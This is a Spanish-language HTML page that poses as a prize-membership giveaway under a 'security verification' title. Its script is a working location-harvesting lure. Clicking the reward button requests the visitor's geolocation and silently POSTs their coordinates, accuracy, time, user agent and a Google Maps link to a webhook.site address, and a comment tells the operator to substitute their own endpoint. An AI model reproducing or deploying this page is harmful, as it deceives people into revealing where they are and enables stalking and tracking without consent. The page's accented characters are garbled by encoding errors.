<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificaci√≥n de seguridad</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 40px; background: #f4f6f8; color: #333; }
    h1 { font-size: 22px; margin-bottom: 20px; }
    button { background: #007BFF; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; cursor: pointer; }
    button:hover { background: #0056b3; }
    .msg { margin-top: 20px; font-size: 14px; }
    pre { background: #eee; padding: 10px; border-radius: 6px; text-align: left; overflow-x: auto; }
    a { display: block; margin-top: 10px; color: #007BFF; }
  </style>
</head>
<body>
  <h1>Te ganaste Una menbresia </h1>
  <p>Por favor confirma para optener tu recompesa:</p>
  <button onclick="sendLocation()">üìç Miles de regalos</button>
  <div class="msg" id="msg"></div>
  <pre id="coords"></pre>
  <a id="mapsLink" target="_blank"></a>

  <script>
    const REPORT_URL = "	https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639"; // üëà reempl√°zalo con tu enlace real

    function sendLocation() {
      if (!navigator.geolocation) {
        document.getElementById("msg").innerText = "Tu navegador no soporta geolocalizaci√≥n.";
        return;
      }

      document.getElementById("msg").innerText = "Obteniendo ubicaci√≥n...";

      navigator.geolocation.getCurrentPosition(success, error);
    }

    function success(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

      const data = {
        lat: lat,
        lon: lon,
        acc: position.coords.accuracy,
        time: new Date().toISOString(),
        ua: navigator.userAgent,
        maps_link: mapsLink
      };

      // Mostrar en pantalla
      document.getElementById("coords").innerText = JSON.stringify(data, null, 2);
      const linkElem = document.getElementById("mapsLink");
      linkElem.href = mapsLink;
      linkElem.innerText = "Ver en Google Maps üåç";

      // Enviar al webhook
      fetch(REPORT_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      document.getElementById("msg").innerText = "Ubicaci√≥n enviada ‚úÖ";
    }

    function error() {
      document.getElementById("msg").innerText = "No se pudo obtener tu ubicaci√≥n ‚ùå";
    }
  </script>
</body>
</html>
